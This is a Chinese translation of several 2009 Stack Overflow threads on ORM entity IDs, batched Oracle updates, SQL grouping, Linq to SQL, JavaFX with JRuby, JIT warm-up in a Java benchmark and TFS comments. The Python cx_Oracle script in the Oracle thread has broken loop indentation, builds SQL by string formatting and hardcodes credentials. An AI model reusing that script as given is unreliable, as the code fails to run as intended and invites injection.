s1.Save(s1); //now instance is persisted, has a DB ID such as identity or Hilo or whatever
s1.close();
var s2 = sessionFactory.OpenSession();
s2.Blah = "Now update, going to find that pretty hard as the 2nd session won't know what ID to use for the UPDATE statement";

s2.Update(instance); //results in boom! exception, the second session has no idea *how* to update this instance.

}
} 
```

如果您担心 ID 字段，您认为这是正确的，除了持久性问题之外，它对其他任何事情都无用，您可以将它们设为私有，因此至少封装了这种行为和语义。您可能会发现这种方法给 TDD 带来了一些摩擦。

我认为您至少关于 NH 的 ID 地图是正确的。如果实例在首次附加到会话时是瞬态的，则您的类型不需要将其数据库 ID 存储在字段中。我认为会话将​​知道如何管理它与数据库的关系。我相信您可以通过测试来证明这种行为；p

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-05-13T20:25:20.503

您必须以一种或另一种方式使用它，以便 ORM 可以返回数据库执行更新；我想它可能是私有的并隐藏在基类中，但这有点违反 POCO 概念。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-05-13T20:26:25.417

假设您的 id 是您的主键，没有它，您将无法将任何数据保存回数据库。
就 equals 和 GetHashCode 而言，它们用于在您创建自定义排序的列表中排序。

> 感谢您的回答。
> 
> 他们中的一些人建议拥有 Id 是 ORM 进行数据库更新的唯一方法。我认为情况并非如此。ORM 已经跟踪从数据库加载的所有实体，因此它应该能够在需要时轻松地在内部获取一个 Id。

如果是这样的话，我会感到非常惊讶。通常它只根据您定义的属性创建一个插入语句。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-05-13T20:30:50.357

没有其他选择可以在没有身份的情况下获取相同的对象。例如，人们有社会安全号码或个人代码或一些独特的东西，我们可以通过它来识别他们。

您可能会使用自然身份，但这很容易出错。

只需将 Id 重命名为 Identity。它在域模型中看起来更好。

实体之所以称为实体，是因为它们具有身份。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2009-05-13T20:35:27.023

我通常将域中的 Id 作为基本实体类包含在内。我不知道使用 ORM 的任何其他方式。

域中的对象通过其引用已经是唯一的，使用 id 来确定唯一性/相等性在实践中并没有那么不同。到目前为止，我还没有遇到这种方法的严重副作用。

* * *

## 回答 #8

> 赞同：-1
> 
> 时间：2009-05-13T20:39:20.107

您还可以使用多个字段来建立身份，称为复合键。但是，这将需要您做更多的工作。

[在这里](https://www.hibernate.org/hib_docs/nhibernate/1.2/reference/en/html_single/#mapping-declaration-compositeid)了解它们

# sql - 以批处理模式运行 Oracle 更新语句

> ID：860214
> 
> 赞同：0
> 
> 时间：2009-05-13T20:22:40.913
> 
> 标签：sql, oracle, plsql

我需要运行几个相对简单的 SQL 更新语句来更新具有 1440 万行的 Oracle 表中的单个列。一条语句运行一个用 Java 编写的函数，当我对所有 1440 万行进行更新时，JVM 内存不足。

您是否编写了一种批处理 PL/SQL 例程，可以将这个简单的更新分解为每批 10K 条记录的集合？我知道如果我可以在一堆记录之后提交我的更新，它会更快，而且我不会耗尽内存。我确信有一种简单的方法可以使用 a 来做到这一点`FOR loop`，`row_num`但我并没有取得太大进展。

这是我需要为每批*n*条记录运行的两条语句：

第一：

```
 update vr_location l set l.usps_address=(
   select mylib.string_utils.remove_duplicate_whitespace(
   house_number || ' ' || pre_street_direction || ' ' || street_name || ' ' || 
   street_description || ' ' || post_street_direction)
 from vr_address a where a.address_pk=l.address_pk); 
```

第二：

```
update vr_location set usps_address = mylib.usaddress_utils.parse_address(usps_address); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-05-13T20:32:51.723

执行初始选择以检索某种分组属性，以便最终获得具有所需行数的组。尝试使用分组子句，例如邮政编码的最后三位数字或半随机的东西。

循环分组子句，使用该子句作为参数来限制每个更新语句所针对的行。在每次迭代结束时提交。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-05-13T20:49:23.383

您（或您的 DBA）应正确调整 UNDO 的大小并将其作为单个 SQL 事务执行

优点是：

*   发生这种情况时读取表上的一致性
*   如果出现故障，您保留回滚事务的能力

如果您处于某种加载环境中，您不关心其中任何一个，则使用 CTAS（创建表作为选择）使用修改后的值创建一个新表，构建索引、约束等，然后交换表名。这些天，1400 万行并不是那么大。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-05-21T23:54:09.573

好吧，我必须完成一些事情，所以我接受了你的建议，然后做了一点 Python 来做。我最终使用 cx_Oracle 来很好地控制交易。显然 PL/SQL 会更好，但我不知道。Python 是我的新锤子，一切都是钉子！

```
#!/usr/bin/env python
import csv
import time
import cx_Oracle

# Parses USPS addresses from voter addresses
# and inserts them into VR_LOCATION table ready
# for geocoding. Does batches by zipcode
def LoadZips():
    zipcodes = []
    zips = open('OH_ZIP_CODES.txt','r')
    for line in zips:
        zip = line[0:5]
        if zip not in zipcodes:
            zipcodes.append(zip)
    zips.close()
    return zipcodes

def UpdateAddresses(ziplist):
    counter = 1
    total = len(ziplist)

    for zipcode in ziplist:
        orcl = cx_Oracle.connect('voter/voter@oracle')
        curs = orcl.cursor()
        countsql = "select count(*) from vr_location where zip_co = '%s'" % zipcode
        concatsql = """update vr_location l set l.usps_address=(
                    select mizar.string_utils.remove_duplicate_whitespace(
                        house_number
                        ||' '||pre_street_direction
                        ||' '||street_name
                        ||' '||street_description
                        ||' '||post_street_direction)
                    from vr_address a where a.address_pk = l.address_pk)
                where zip_co = '%s'""" % zipcode
        parsesql = """update vr_location set usps_address =  mizar.usaddress_utils.parse_address(usps_address)
                where zip_co = '%s'""" % zipcode
        curs.execute(countsql)

        records_affected = curs.fetchone()[0]
    if records_affected == 0:
        print "No records for zipcode %s" % zipcode
        counter += 1 
        continue

    print "[%s] %s of %s: %s addresses" % (zipcode, counter, total, records_affected)
    curs.execute(concatsql)
    orcl.commit()
    curs.execute(parsesql)
    orcl.commit()
    curs.close()
    counter += 1 

    # Uncomment this to debug - just steps through X zipcodes      
    #if counter == 3:
    #    print "Cleaning up..."
    #    break

if __name__ == "__main__":
    start = time.clock()
    zipcodes = LoadZips()
    print "Processing addresses in %s zip codes" % len(zipcodes)
    UpdateAddresses(zipcodes) 
```

[关于该主题的博客文章](http://dylandoesdigits.blogspot.com/2009/05/using-python-and-oracle-with-cxpython.html)

# sql-server - SQL子查询问题

> ID：860221
> 
> 赞同：0
> 
> 时间：2009-05-13T20:25:06.730
> 
> 标签：sql-server, tsql

仅当此查询返回大于 0 时，我才想选择 tblProperty.ID

```
SELECT     
    COUNT(tblProperty.ID) AS count
FROM         
    tblTenant AS tblTenant 
    INNER JOIN tblRentalUnit
        ON tblTenant.UnitID = tblRentalUnit.ID 
    INNER JOIN tblProperty
        ON tblTenant.PropertyID = tblProperty.ID 
        AND tblRentalUnit.PropertyID = tblProperty.ID
WHERE tblProperty.ID = x 
```

其中 x 等于它正在查看的父级的 tblProperty.ID。**我不知道'x'是什么。**

我怎样才能做到这一点？

```
Database Structure:
tblTenant:
  ID
  PropertyID <--foreign key to tblProperty
  UnitID     <--foreign key to tblRentalUnit
  Other Data
tblProperty:
  ID
  Other Data
tblRentalUnit:
  ID
  PropertyID <--foreign key to tblProperty
  Other Data 
```

查询说明：
查询仅选择具有出租单元且租户居住在其中的物业。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-05-13T20:31:50.557

```
SELECT     
   tblProperty.ID
FROM         
    tblTenant AS tblTenant 
    INNER JOIN tblRentalUnit AS tblRentalUnit 
        ON tblTenant.UnitID = tblRentalUnit.ID 
    INNER JOIN tblProperty AS tblProperty 
        ON tblTenant.PropertyID = tblProperty.ID 
        AND tblRentalUnit.PropertyID = tblProperty.ID
GROUP BY tblProperty.ID
HAVING COUNT(tblProperty.ID) > 1 
```

应该管用。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-05-13T20:37:09.347

> 查询是：仅选择具有出租单元且有租户居住的物业。

```
SELECT
  p.ID
FROM
  tblProperty              AS p
  INNER JOIN tblRentalUnit AS u ON u.PropertyID = p.ID
  INNER JOIN tblTenant     AS t ON t.UnitID     = u.ID
GROUP BY
  p.ID 
```

这应该这样做。内部连接明确*不*选择任何未引用的记录，这意味着这只选择那些拥有出租单元和租户的属性。

我不知道为什么你的`tblTenant`链接到`tblProperty`. 看起来这似乎不是必需的，因为链接似乎来自租户->出租单元->财产。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-05-13T20:32:21.740

将以下内容添加到查询的末尾。这假设如果计数为 1 或 0，您不希望返回任何内容。

```
HAVING COUNT(tblProperty.ID) > 1 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-05-13T20:32:09.870

也许是 GROUP BY 子句？选择一个临时表，然后从#tmp 中选择，如果这样更容易的话。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-05-13T20:33:08.620

将开始更改为`SELECT tblProperty.ID`末尾并添加`HAVING COUNT(tblProperty.ID) > 1`怎么样？虽然我承认我不理解你的`AS`条款——它们对我来说似乎完全多余，每一个……

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-05-13T20:47:20.610

实际上，这有效：

```
SELECT DISTINCT
     p.ID
FROM         tblProperty AS p LEFT OUTER JOIN
                      tblTenant AS t ON t.PropertyID = p.ID
WHERE     (t.UnitID IS NOT NULL) 
```

# asp.net - Linq to SQL：如何使用存储过程更新数据

> ID：860227
> 
> 赞同：2
> 
> 时间：2009-05-13T20:26:35.777
> 
> 标签：asp.net

我正在使用 linq to sql。我想使用存储过程使用 linq to sql 更新我的对象更改问题任何人有想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-05-13T20:28:54.820

创建您的程序。将其拖到数据上下文设计器中。它会为你生成一个方法。只需使用适当的参数调用它就可以了。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-05-13T20:30:01.213

从字面上看，它就像在 Visual Studio 的 DBML 编辑器中拖放存储过程一样简单。

[看这里](http://codebetter.com/blogs/david.hayden/archive/2008/02/19/linq-to-sql-and-stored-procedures-visual-studio-2008-and-repository-factory.aspx)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-05-13T20:36:24.777

您可以在 Visual Studio 的 DBML 编辑器中拖动存储过程。

当你去调用你的存储过程时，你可以直接调用它。您不需要添加任何特殊的 LINQ 查询来执行此操作：

```
using (MyDataContext db = MyContextFactory.CreateContext())
{
    db.spStoredProcedure(parameters);
} 
```

# java - 有人试过混合 JavaFX 和 JRuby 吗？

> ID：860228
> 
> 赞同：8
> 
> 时间：2009-05-13T20:27:09.440
> 
> 标签：java, swing, jruby, javafx

有没有人试过混合`JavaFX`和`JRuby`？我已经构建了一个带有 Swing GUI（100% JRuby）的 JRuby 桌面应用程序，并且我正在考虑用 JavaFX 替换 GUI 以获得更流畅的感觉。

为了适应我当前的应用程序，我想实现一个 MVC 模式，其中 View 是 JavaFX，Controller 和 Model 是 Ruby。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-14T16:41:43.150

现在有一个来自 JRuby 项目的[JRubyFX](https://github.com/jruby/jrubyfx) gem 用于处理 JavaFX 2.0。它支持代码中的 JavaFX 和 FXML。大多数事情应该可以工作，但它有一些问题记录在自述文件中。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2011-04-05T20:25:56.223

JavaFX 2.0 出来后会容易得多。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-18T14:55:36.407

从 java 7u6 开始，javafx 现在是 java 语言的一部分，默认情况下可用于 Linux、Mac 和 Windows。您可以在 jvm 上使用任何语言对其进行编程，因此现在您应该能够非常轻松地编写应用程序。

JavaFX 脚本已被删除，但 JavaFX 技术比以往任何时候都更大更好。现在一切都直接包含在 API 中，因此使用 Groovy 或 JRuby 为使用 JavaFX 提供了一个很好的脚本框架。

快乐编码！

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-05-28T08:28:19.857

至于 JavaFX Script 和 J Ruby 之间的概念差异，有很多。我将从 JRuby 开始。JRuby 本身实际上并不是一种语言。相反，它是 Ruby 编程语言*的 Java实现。*Ruby 的原始运行时解释器是用 C 编写的（也许有些是用 C++ 编写的，我不确定）。JRuby 项目是由一些想要使用 Java 编写的 Ruby 运行时实现的人发起的。

为什么？嗯，有一些有趣的优势。首先，他们能够非常容易地从 Ruby 应用程序调用 Java 代码。其次，这意味着 Ruby 程序最终由 Java 虚拟机 (JVM) 运行，因此可以从过去十年在 JVM 上完成的所有优化工作中受益。今天，JRuby 仅用作解释器，但从本月早些时候一位项目负责人那里听到的消息，他们非常接近能够将 Ruby 程序直接编译成 JVM 字节码，这将提供另一个性能提升。

最后，JRuby 对于用 Ruby 编写但想要利用其中任何一个的项目非常有趣：现有的 Java 库或现有的 Java 运行时（JVM，甚至像 GlassFish 和 Tomcat 这样的应用程序/Web 服务器）或两者兼而有之。

另一方面，JavaFX 是直接注入的脚本语言，用于创建图形类的东西。也非常实用。因此，当您遵循设计模式时，在这种情况下使用 MVC，如果您遵循规则，它应该没问题。但是相信可能会开始使用 FX 和 JRuby 的情况很少。

# java - 第一次 Java 循环运行缓慢，为什么？[太阳热点 1.5，sparc]

> ID：860231
> 
> 赞同：11
> 
> 时间：2009-05-13T20:28:47.427
> 
> 标签：java, performance, jvm-hotspot, microbenchmark

在 Solaris SPARC 机器上对一些 Java 代码进行基准测试时，我注意到我第一次调用基准测试函数时，它的运行速度非常慢（相差 10 倍）：

*   第一 | 1 | 25295.979 毫秒
*   第二 | 1 | 2256.990 毫秒
*   第三| 1 | 2250.575 毫秒

为什么是这样？我怀疑 JIT 编译器，有没有办法验证这一点？

**编辑：**根据一些答案，我想澄清一下，这段代码是我能找到的表现这种行为的最简单的测试用例。所以我的目标不是让它快速运行，而是要了解发生了什么，这样我就可以在我的实际基准测试中避免它。

**已解决：** Tom Hawtin 正确地指出我的“慢”时间实际上是合理的。根据这一观察，我将调试器附加到 Java 进程。在第一个过程中，内部循环如下所示：

```
0xf9037218:     cmp      %l0, 100
0xf903721c:     bge,pn   %icc,0xf90371f4        ! 0xf90371f4
0xf9037220:     nop
0xf9037224:     ld       [%l3 + 92], %l2
0xf9037228:     ld       [%l2 + 8], %l6
0xf903722c:     add      %l6, 1, %l5
0xf9037230:     st       %l5, [%l2 + 8]
0xf9037234:     inc      %l0
0xf9037238:     ld       [%l1], %g0
0xf903723c:     ba,pt    %icc,0xf9037218        ! 0xf9037218 
```

在以下迭代中，循环如下所示：

```
0xf90377d4:     sub      %l2, %l0, %l3
0xf90377d8:     add      %l3, %l0, %l2
0xf90377dc:     add      %l2, 1, %l4
0xf90377e0:     inc      %l0
0xf90377e4:     cmp      %l0, 100
0xf90377e8:     bl,pn    %icc,0xf90377d8        ! 0xf90377d8 
```

因此，HotSpot 从内部循环中移除了内存访问，将其加速了一个数量级。

**教训：**做数学！我应该自己做汤姆的计算。

基准 Java 代码：

```
 private int counter;
    private int nThreads;

    private void measure(String tag) throws Exception {
            MyThread threads[] = new MyThread[nThreads];
            int i;

            counter = 0;

            for (i = 0; i < nThreads; i++)
                    threads[i] = new MyThread();

            long start = System.nanoTime();

            for (i = 0; i < nThreads; i++)
                    threads[i].start();

            for (i = 0; i < nThreads; i++)
                    threads[i].join();

            if (tag != null)
                    System.out.format("%-20s | %-2d | %.3f ms \n", tag, nThreads,
                                     new Double((System.nanoTime() - start) / 1000000.0));
    }
    public MyBench() {
            try {
                    this.nThreads = 1;
                    measure("First");
                    measure("Second");
                    measure("Third");
            } catch (Exception e) {
                    System.out.println("Error: " + e);
            }
    }

    private class MyThread extends Thread {
            public void run() {
                    while (counter < 10000000) {
                            // work
                            for (int j = 0; j < 100; j++)
                                    counter++;
                            counter -= 99;
                    }
            }
    } 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2009-05-13T21:17:19.267

一些丑陋、不切实际的代码（微基准测试的东西）：

```
 while (counter < 10000000) {
                        // work
                        for (int j = 0; j < 100; j++)
                                counter++;
                        counter -= 99;
                } 
```

那么这是在做什么以及它应该运行多快。

内部循环将 counter 递增 100 次，然后将 counter 递减 99。因此递增 1。注意 counter 是外部类的成员变量，因此存在一些开销。然后运行 ​​10,000,000 次。所以内部循环运行了 1,000,000,000 次。

一个使用访问器方法的循环，称为 25 个循环。在 1 GHz 时 1,000,000,000 次，为 25 秒。

嘿，我们预测了**慢速**时间。慢的时间很快。快速时间是在基准以某种方式被打破之后 - 2.5 个周期的迭代？使用 -server 你可能会发现它变得更加愚蠢。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2009-05-13T21:31:26.107

可能是类加载或本地方法的动态链接。如果您使用以下 JVM 参数运行 Java（完整列表请参见[此处](http://java.sun.com/javase/technologies/hotspot/vmoptions.jsp)），它将打印有关花费时间的信息：

`-verbose:class -verbose:jni -verbose:gc -XX:+PrintCompilation`

要准确找出每个 measure() 调用的开始和结束位置，请在这些方法之间添加一些新类的初始化作为标记，以便`-verbose:class`在日志中的哪个点显示标记类被加载。有关类似测量，请参阅[此答案。](https://stackoverflow.com/questions/804620/java-why-do-two-consecutive-calls-to-the-same-method-yield-different-times-for-e/804743#804743)

为了准确了解您的代码的作用，我对其进行了如下修改：

```
public MyBench() {
    try {
        this.nThreads = 1;
        new Mark1();
        measure("First");
        new Mark2();
        measure("Second");
        new Mark3();
        measure("Third");
        new Mark4();
    } catch (Exception e) {
        System.out.println("Error: " + e);
    }
}

private static class Mark1 {
}
private static class Mark2 {
}
private static class Mark3 {
}
private static class Mark4 {
} 
```

然后通过查看 JVM 何时加载那些 Mark1 等类，结果如下。

在第一次调用 measure() 期间，总共加载了 85 个类，动态链接了 11 个本地方法，并 JIT 编译了 5 个方法：

```
[Loaded MyBench$Mark1 from file:/D:/DEVEL/Test/classes/]
[Loaded java.net.InetSocketAddress from shared objects file]
[Loaded java.net.InetAddress from shared objects file]
[Loaded MyBench$MyThread from file:/D:/DEVEL/Test/classes/]
[Loaded sun.security.action.GetBooleanAction from shared objects file]
[Dynamic-linking native method java.net.InetAddress.init ... JNI]
[Loaded java.net.InetAddress$Cache from shared objects file]
[Loaded java.lang.Enum from shared objects file]
[Loaded java.net.InetAddress$Cache$Type from shared objects file]
[Loaded java.net.InetAddressImplFactory from shared objects file]
[Dynamic-linking native method java.net.InetAddressImplFactory.isIPv6Supported ... JNI]
 22       MyBench::access$508 (12 bytes)
[Loaded java.net.InetAddressImpl from shared objects file]
[Loaded java.net.Inet4AddressImpl from shared objects file  1%      MyBench$MyThread::run @ 14 (48 bytes)
]
[Loaded sun.net.spi.nameservice.NameService from shared objects file]
[Loaded java.net.InetAddress$1 from shared objects file]
[Loaded java.net.Inet4Address from shared objects file]
[Dynamic-linking native method java.net.Inet4Address.init ... JNI]
[Dynamic-linking native method java.net.PlainSocketImpl.socketCreate ... JNI]
[Dynamic-linking native method java.net.PlainSocketImpl.socketBind ... JNI]
[Dynamic-linking native method java.net.PlainSocketImpl.socketListen ... JNI]
[Loaded java.net.Socket from shared objects file]
[Dynamic-linking native method java.net.PlainSocketImpl.socketAccept ... JNI]
[Loaded java.lang.Integer$IntegerCache from shared objects file]
[Loaded java.util.Formatter from C:\Program Files\Java\jdk1.6.0_11\jre\lib\rt.jar]
[Loaded java.util.regex.Pattern$6 from C:\Program Files\Java\jdk1.6.0_11\jre\lib\rt.jar]
[Loaded java.text.DecimalFormatSymbols from shared objects file]
[Loaded java.util.spi.LocaleServiceProvider from shared objects file]
[Loaded java.text.spi.DecimalFormatSymbolsProvider from shared objects file]
[Loaded sun.util.LocaleServiceProviderPool from shared objects file]
[Loaded java.util.LinkedHashSet from shared objects file]
[Loaded sun.util.LocaleServiceProviderPool$1 from shared objects file]
[Loaded java.util.ServiceLoader from shared objects file]
[Loaded java.util.ServiceLoader$LazyIterator from shared objects file]
[Loaded java.util.ServiceLoader$1 from shared objects file]
[Loaded java.util.HashMap$EntrySet from shared objects file]
[Loaded java.util.LinkedHashMap$LinkedHashIterator from shared objects file]
[Loaded java.util.LinkedHashMap$EntryIterator from shared objects file]
[Loaded sun.misc.Launcher$1 from shared objects file]
 23  !    java.io.BufferedReader::readLine (304 bytes)
[Loaded sun.misc.Launcher$2 from shared objects file]
[Loaded sun.misc.URLClassPath$2 from shared objects file]
[Loaded java.lang.ClassLoader$2 from shared objects file]
[Loaded sun.misc.URLClassPath$1 from shared objects file]
[Loaded java.net.URLClassLoader$3 from shared objects file]
[Loaded sun.misc.CompoundEnumeration from shared objects file]
 24       sun.nio.cs.UTF_8$Decoder::decodeArrayLoop (553 bytes)
[Loaded java.io.FileNotFoundException from shared objects file]
[Loaded java.net.URLClassLoader$3$1 from shared objects file]
[Dynamic-linking native method java.security.AccessController.doPrivileged ... JNI]
[Loaded sun.util.resources.LocaleData from shared objects file]
[Loaded sun.util.resources.LocaleData$1 from shared objects file]
[Loaded java.util.ResourceBundle$Control from shared objects file]
[Loaded sun.util.resources.LocaleData$LocaleDataResourceBundleControl from shared objects file]
[Loaded java.util.Arrays$ArrayList from shared objects file]
[Loaded java.util.Collections$UnmodifiableCollection from shared objects file]
 25       java.lang.String::startsWith (78 bytes)
[Loaded java.util.Collections$UnmodifiableList from shared objects file]
[Loaded java.util.Collections$UnmodifiableRandomAccessList from shared objects file]
[Loaded java.util.ResourceBundle from shared objects file]
[Loaded java.util.ResourceBundle$1 from shared objects file]
[Dynamic-linking native method java.util.ResourceBundle.getClassContext ... JNI]
[Loaded java.util.ResourceBundle$RBClassLoader from shared objects file]
[Loaded java.util.ResourceBundle$RBClassLoader$1 from shared objects file]
[Loaded java.util.ResourceBundle$CacheKey from shared objects file]
[Loaded java.util.ResourceBundle$CacheKeyReference from shared objects file]
[Loaded java.util.ResourceBundle$LoaderReference from shared objects file]
[Loaded java.util.ResourceBundle$SingleFormatControl from shared objects file]
[Loaded sun.util.LocaleDataMetaInfo from shared objects file]
[Loaded java.util.AbstractList$Itr from shared objects file]
[Loaded java.util.ListResourceBundle from shared objects file]
[Loaded sun.text.resources.FormatData from shared objects file]
[Dynamic-linking native method java.lang.Class.isAssignableFrom ... JNI]
[Loaded java.util.ResourceBundle$BundleReference from shared objects file]
[Loaded sun.text.resources.FormatData_fi from C:\Program Files\Java\jdk1.6.0_11\jre\lib\rt.jar]
[Loaded sun.text.resources.FormatData_fi_FI from C:\Program Files\Java\jdk1.6.0_11\jre\lib\rt.jar]
[Loaded java.util.Currency from shared objects file]
[Loaded java.util.Currency$1 from shared objects file]
[Loaded java.util.CurrencyData from shared objects file]
[Loaded sun.reflect.UnsafeFieldAccessorFactory from shared objects file]
[Loaded sun.reflect.UnsafeQualifiedStaticFieldAccessorImpl from shared objects file]
[Loaded sun.reflect.UnsafeQualifiedStaticObjectFieldAccessorImpl from shared objects file]
[Loaded java.util.spi.CurrencyNameProvider from shared objects file]
[Loaded sun.util.resources.OpenListResourceBundle from shared objects file]
[Loaded sun.util.resources.LocaleNamesBundle from shared objects file]
[Loaded sun.util.resources.CurrencyNames from shared objects file]
[Loaded sun.util.resources.CurrencyNames_fi_FI from C:\Program Files\Java\jdk1.6.0_11\jre\lib\rt.jar]
[Loaded java.util.regex.MatchResult from shared objects file]
[Loaded java.util.regex.Matcher from shared objects file]
[Loaded java.util.regex.ASCII from shared objects file]
[Loaded java.util.Formatter$FormatString from C:\Program Files\Java\jdk1.6.0_11\jre\lib\rt.jar]
[Loaded java.util.Formatter$FormatSpecifier from C:\Program Files\Java\jdk1.6.0_11\jre\lib\rt.jar]
[Loaded java.util.Formatter$Flags from C:\Program Files\Java\jdk1.6.0_11\jre\lib\rt.jar]
[Loaded java.util.Formatter$Conversion from C:\Program Files\Java\jdk1.6.0_11\jre\lib\rt.jar]
[Loaded java.util.Formatter$FixedString from C:\Program Files\Java\jdk1.6.0_11\jre\lib\rt.jar]
[Loaded java.util.Formattable from C:\Program Files\Java\jdk1.6.0_11\jre\lib\rt.jar]
[Dynamic-linking native method java.io.FileOutputStream.writeBytes ... JNI]
First                | 1  | [Loaded sun.misc.FormattedFloatingDecimal from C:\Program Files\Java\jdk1.6.0_11\jre\lib\rt.jar]
[Loaded sun.misc.FormattedFloatingDecimal$1 from C:\Program Files\Java\jdk1.6.0_11\jre\lib\rt.jar]
[Loaded sun.misc.FormattedFloatingDecimal$Form from C:\Program Files\Java\jdk1.6.0_11\jre\lib\rt.jar]
[Loaded sun.misc.FormattedFloatingDecimal$2 from C:\Program Files\Java\jdk1.6.0_11\jre\lib\rt.jar]
2072,825 ms 
```

在第二次调用期间，只有一个方法被 JIT 编译：

```
[Loaded MyBench$Mark2 from file:/D:/DEVEL/Test/classes/]
 26       MyBench$MyThread::run (48 bytes)
Second               | 1  | 2058,669 ms 
```

在第三次通话期间，没有发生额外的工作：

```
[Loaded MyBench$Mark3 from file:/D:/DEVEL/Test/classes/]
Third                | 1  | 2093,659 ms 
```

这是在带有 jdk1.6.0_11 的 Windows 上运行的，因此您的系统可能会做一些不同的事情。例如，可能动态方法的链接之一在您的系统上异常缓慢。或者然后所有的类加载都比较慢。尝试查看日志，是否有异常长的暂停，或者所有这些操作是否同样缓慢。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2009-05-13T20:35:55.837

添加类加载作为嫌疑人。类在第一次引用时延迟加载。所以代码第一次运行时，你可能是第一次引用一些类。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2009-05-13T21:04:27.540

验证 JIT 编译器是否是后续迭代中加速的原因的最佳方法是在关闭 JIT 编译器的情况下运行基准测试。为此，请指定系统属性`java.compiler=NONE`（单词“none”必须大写）。

花在类加载上的时间也会导致基准代码在第一次运行时变慢。最后，调用 Thread.start() 和调用 Thread 的 run() 方法之间存在不确定的延迟。

您可能需要考虑寻找一个基准框架。一个好的框架会通过运行多次迭代来“预热”代码，然后用不同的迭代次数进行多次计时。请参阅[Java 理论与实践：有缺陷的微基准分析](http://www.ibm.com/developerworks/java/library/j-jtp02225.html)。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-05-13T20:34:22.127

这是一个有趣的问题。我怀疑 JIT 编译器，但这些是我的数字：

```
第一 | 1 | 2399.233 毫秒
第二 | 1 | 2322.359 毫秒
第三| 1 | 2408.342 毫秒

```

可能 Solaris 正在用线程做一些有趣的事情；你试过`nThreads = 10`吗？

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2009-05-13T20:43:31.457

我建议您使 nThread = Runtime.getRuntime().availableProcessors() 这将为您提供最佳线程数以使用系统中的所有内核。

您可以尝试关闭 JIT 以查看它有什么不同。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2009-05-13T20:54:12.173

您可以让 VM 记录有关类加载和编译的信息，尝试以下 VM 参数： -XX:+PrintCompilation -XX:+TraceClassLoading 这可能会提供一些关于幕后发生的事情的更多线索。

编辑：我不确定这些选项在 java 1.5 中是否有效（我在 1.6 中使用过它们）。我会尝试检查...再次编辑：它适用于java 1.5（注意您需要+，而不是-，或者您关闭该选项...）

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2009-05-13T21:11:31.473

我相信您也可以使用 -Xint 的 java 命令的非标准选项来禁用 HotSpot 并仅解释您的代码。这至少可以将 HotSpot 排除在解释您的时间安排之外。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2009-05-13T20:34:59.943

它是工作中的热点编译器。AFAIK，第一次运行函数，运行“解释”并分析执行路径，然后JIT编译器可以优化后续的函数调用。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2009-05-13T20:47:03.090

它肯定是热点编译器。如果您在 64 位 solaris 上运行，则默认为服务器 VM，热点在第一次执行时开始优化。在客户端虚拟机上，代码可能需要在热点启动之前运行几次。（我相信 solaris 只有*服务器*虚拟机，但我可能错了）

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2009-05-13T21:01:38.637

请参阅[http://java.sun.com/javase/6/docs/technotes/guides/vm/server-class.html](http://java.sun.com/javase/6/docs/technotes/guides/vm/server-class.html)了解启动器如何在客户端和服务器 VM 之间进行选择，以及不同处理器和操作系统支持的内容。

# tfs - 如何跟踪谁在 TFS 工作项上输入了评论

> ID：860237
> 
> 赞同：3
> 
> 时间：2009-05-13T20:30:52.337
> 
> 标签：tfs, tfs-workitem

在其他错误跟踪系统中处理问题时，有一些方法可以为清楚地标有作者用户名和输入日期的项目添加注释。我正在 TFS 的工作项中寻找类似的功能。**有这样的功能吗？**

我们目前使用的系统允许我们点击热键将当前时间和用户名粘贴到多行文本字段中。所有用户都知道将该信息粘贴到他们键入的内容上方。虽然这是手动的，但它是可以接受且容易的。例如：

```
2009 年 5 月 1 日凌晨 1:20:00 - AManagr-
推迟到下一个版本，这就是为什么...

2009 年 4 月 24 日凌晨 1:20:00 - ADev -
QA 机器的 XYZ Gizmo 组件已过时。这是发生这种情况的复杂方式......等等等等......这很难解决。

2009 年 4 月 22 日上午 1:20:00 - QAGuy -
我无法将报告保存为 PDF 文件。

```

我用过的其他工具（也许是 Mantis？）有一个“笔记”功能。所以我不能忘记在评论上写上我的名字，或者知道新笔记是放在字段的顶部还是底部，等等。 ..

手动输入您的姓名和日期/时间不是一个（好的）选项。但是，按一个键或工具栏按钮就可以了。

我不是在寻找关于将这样的长格式“笔记”分解为多个特定单独字段的建议。另外，我知道工作项的历史选项卡，但这还不够。谁写了什么，什么时候写的需要清楚，并且与文本的观点相同。

**更新**

想象一下几个团队成员正在研究一个问题。它们都向工作项添加信息，每个都将更多文本附加到同一字段。您如何轻松知道谁添加了哪个部分？

历史日志为每个用户的更改显示一行，甚至显示该字段的更改。但那是在另一个屏幕上，很难在精神上解析它显示的数据。

他们可以“签署”文本的每一部分——但如果没有工具的帮助，这会很痛苦。

也许 Stackoverflows 的评论功能也是一个很好的例子。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-05-13T21:04:49.050

是的你可以。TFS 工作项是可定制的。在这个版本中没有我想要的那么多，但你可以做你想做的事。

